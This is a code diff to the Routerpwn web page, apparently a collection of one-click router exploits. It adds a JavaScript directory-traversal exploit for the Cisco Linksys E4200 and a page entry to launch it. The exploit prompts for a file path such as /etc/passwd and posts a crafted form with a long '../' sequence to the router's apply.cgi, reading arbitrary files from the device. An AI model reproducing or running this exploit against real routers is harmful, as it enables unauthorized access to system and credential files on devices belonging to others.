@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.215</title>
+		<title>Routerpwn 1.13.216</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -306,6 +306,21 @@ function td8840t_resetauth(ip)
     document.location="http://"+ip+"/Forms/tools_admin_1";
     
 }
+
+// Cisco Linksys E4200 - Directory Traversal
+function e4200_dirtraversal(ip)
+{
+
+	ip = ip || "192.168.1.254";
+	path = prompt("Path: (ex: /etc/passwd)");
+	var form = '<input	type="hidden"	name="submit_type" value="nas_admin"/>\
+	<input	type="hidden"	name="submit_button"	value="NAS_Adminstration"/>\
+	<input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
+	<input	type="hidden"	name="next_page"	value="../../../../../../../../../../../../../../../..' + path + '"/></form>';
+	post('http://' + ip + '/storage/apply.cgi', form);
+	
+}
+
 
 // Linksys X3000 - OS Command Inyection
 function x3000_command(ip)
@@ -2539,6 +2554,9 @@ a=a+1
 <h2>Cisco</h2>
 <h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">Linksys WAG120N, <a href="javascript:img('Linksys X3000')">Linksys X3000, <a href="javascript:img('Linksys X3000')">Linksys X3000</a> , <a href="javascript:img('Linksys WRT110')">Linksys WRT110</a> , <a href="javascript:img('EPC3925')">EPC3925</h3>
 
+
+
+
 <article>
 	<div>12/11/13</div>
 	<div><a href="http://www.exploit-db.com/exploits/30362/">[+]</a></div>
@@ -2613,6 +2631,13 @@ a=a+1
 	<div><a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">[+]</a></div>
 	<div><a href="javascript:javascript:document.ea2700xss.submit()">EA2700 XSS Vulnerability apply.cgi</a></div>
 	<div><a href="javascript:ea2700xssr()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>05/07/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/25292/">[+]</a></div>
+	<div><a href="javascript:e4200_dirtraversal()">Cisco Linksys E4200 - Directory Traversal</a></div>
+	<div><a href="javascript:e4200_dirtraversal(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <article>
